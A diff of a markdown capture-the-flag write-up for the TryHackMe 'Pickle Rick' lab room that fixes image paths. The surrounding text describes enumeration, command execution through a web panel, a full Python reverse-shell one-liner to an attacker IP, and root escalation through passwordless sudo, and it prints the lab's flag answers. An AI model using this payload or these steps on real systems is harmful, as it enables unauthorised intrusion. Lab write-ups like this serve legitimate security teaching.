@@ -26,58 +26,58 @@ Next, as part of the enumeration process, nmap is ran to discover what ports and
 
 Details of both the nmap and gobuster results scans can be found in the [Enumeration-Results](https://github.com/Sciratec/TryHackMe/tree/main/pickleRick/Enumeration-Results) directory. Now lets look at the results of the gobuster scan.
 
-![GoBuster](../../static/writeupimgs/picklerickimgs/GoBuster.png "Gobuster scan")
+![GoBuster](../../../static/writeupimgs/picklerickimgs/GoBuster.png "Gobuster scan")
 
 Looks like we now have places to go and things to do. So lets start looking at these pages that gobuster dug up. Looks like we have 3 files that look interesting. Lets start with `/login.php`.
 
 
-![login.php](../../static/writeupimgs/picklerickimgs/loginpage.png)
+![login.php](../../../static/writeupimgs/picklerickimgs/loginpage.png)
 
 Looks like we found where the username maybe used. Lets continue onto `robots.txt`. For the sake of time, `portal.php` is a redirect to `login.php`.
 
-![robots.txt](../../static/writeupimgs/picklerickimgs/wubbalubbadubdub.png)
+![robots.txt](../../../static/writeupimgs/picklerickimgs/wubbalubbadubdub.png)
 
 > Wubbalubbadubdub
 
 Wubbalubbadubdub! With that out of the way, what do we have here? Random text? Perhaps a password? Only one way to find out.
 
-![loggedin](../../static/writeupimgs/picklerickimgs/loggedin.png)
+![loggedin](../../../static/writeupimgs/picklerickimgs/loggedin.png)
 
 In the words of Bender, "Neat". Looks like we have a command panel that is waiting for commands. What type of commands though? During our enumeration the nmap scan revealed that the machine is using Ubuntu Linux OS and Ubuntu uses Bash. So lets try a Bash command to verify this with the command `whomai`. A command to print out the current user.
 
-![whomai](../../static/writeupimgs/picklerickimgs/whoami.png)
+![whomai](../../../static/writeupimgs/picklerickimgs/whoami.png)
 
 Woop, we have remote code execution! Lets get a feel for what is on the machine's backend. How about... listing everything in the current website root directory with `ls`?
 
-![ls](../../static/writeupimgs/picklerickimgs/s.png)
+![ls](../../../static/writeupimgs/picklerickimgs/s.png)
 
 Ah, here we see the files that were enumerated from the gobuster scan, but what is this? Two other interesting files that were not found during our enumeration, I wonder what their contents are. There is a command for that, namely the `cat` command.
 > Sup3rS3cretPickl3Ingred.txt and clue.txt
 
-![Cat Fail](../../static/writeupimgs/picklerickimgs/catfail.png)
+![Cat Fail](../../../static/writeupimgs/picklerickimgs/catfail.png)
 
 I know Mr. Meeseek, that was a cat-tastrophe. Nope, not apologizing. Fortunately there is another command that can do the same thing, the `less` command. Like `cat` it prints the contents out of a file given, but utilizes pagination.
 
-![First Flag](../../static/writeupimgs/picklerickimgs/firstflag.png)
+![First Flag](../../../static/writeupimgs/picklerickimgs/firstflag.png)
 > mr. meeseek hair
 
 And boom goes the dynamite we have our first flag. While aging myself with that very old meme, and if you can recall, there was another text file that was left for us as a clue.
 
-![clue.txt](../../static/writeupimgs/picklerickimgs/cluetxt.png)
+![clue.txt](../../../static/writeupimgs/picklerickimgs/cluetxt.png)
 
 Mmmk. Seems pretty simple. Like listing everything in a working directory we can use `ls` again to start enumerating other directories. Lets start in the `/home` directory which houses all of the users on the OS.
 
 
-![users](../../static/writeupimgs/picklerickimgs/users.png)
+![users](../../../static/writeupimgs/picklerickimgs/users.png)
 > rick
 
 It's pickle RII... no, no, no, not doing that. However, we can list everything in the `rick` user directory.
 
-![Rick User Dir](../../static/writeupimgs/picklerickimgs/ricklist.png)
+![Rick User Dir](../../../static/writeupimgs/picklerickimgs/ricklist.png)
 
 At this point we know what is needed to be done. However, unlike the other flag this one is different. It has a space in it. Yes, that actually matters. Not to worry, by appending trailing `\`s to both the end of string one and the beginning of string two such as, `second\ \ingredients` which escapes the whitespace and allows us to print out the contents.
 
-![Second Flag](../../static/writeupimgs/picklerickimgs/secondflag.png)
+![Second Flag](../../../static/writeupimgs/picklerickimgs/secondflag.png)
 
 > 1 jerry tear
 
@@ -88,12 +88,12 @@ Turning to [the reverse shell cheatsheet](https://github.com/swisskyrepo/Payload
 
 All hope is lost. No, there is another... language we can use to possible gain a foothold. Ubuntu comes with another language called python, in which there is two versions python2 and python3. Now `which python` does it have? This gives us nothing. How about `which python3`? There it be, python3. Taking a look back to the cheatsheet shows that python can be utilized to gain a reverse shell. First, we set up our netcat listener
 
-![netcat](../../static/writeupimgs/picklerickimgs/picklerickimgsnetcat.png)
+![netcat](../../../static/writeupimgs/picklerickimgs/picklerickimgsnetcat.png)
 
 Then execute payload `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacking ip>",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 
 
-![Reverse Shell](../../static/writeupimgs/picklerickimgs/reverseshell.png)
+![Reverse Shell](../../../static/writeupimgs/picklerickimgs/reverseshell.png)
 
 That did it! We now have connected to the machine using a reverse shell. However, that third ingredient is still here somewhere, "stay on target". At this point, we have exhausted our search for the flag in areas we can get to, but what about areas that we cannot?
 
@@ -101,19 +101,19 @@ In Linux there is a command called `sudo` this is simple command can literally, 
 
 
 
-![Sudo -l](../../static/writeupimgs/picklerickimgs/sudo.png)
+![Sudo -l](../../../static/writeupimgs/picklerickimgs/sudo.png)
 
 You see this? This is a major no no. This is bad... for them. Our current user can use `sudo` with no password. At this point it should considered root as we can use this misconfigured sudo user to escalate directly to the root user with 0 authentication. To swtich users we use the `su` command. However paired with another command like `sudo` and you can not switch users using the built in escalation command to become root
 
 
-![Priv Escalation](../../static/writeupimgs/picklerickimgs/escalation.png)
+![Priv Escalation](../../../static/writeupimgs/picklerickimgs/escalation.png)
 
 > I'm root
 
 
 And just like that we have root. We could use `find / -name "*.txt" -type f 2>/dev/null` but that would search the whole system looking for anything with a .txt file and the results would be to much for me to sift through manually. So let us start simple and look into the /root directory. Like `/home`, but for root.
 
-![Third Flag](../../static/writeupimgs/picklerickimgs/thirdflag.png)
+![Third Flag](../../../static/writeupimgs/picklerickimgs/thirdflag.png)
 
 And there it is, the third and final flag
 > fleeb juice
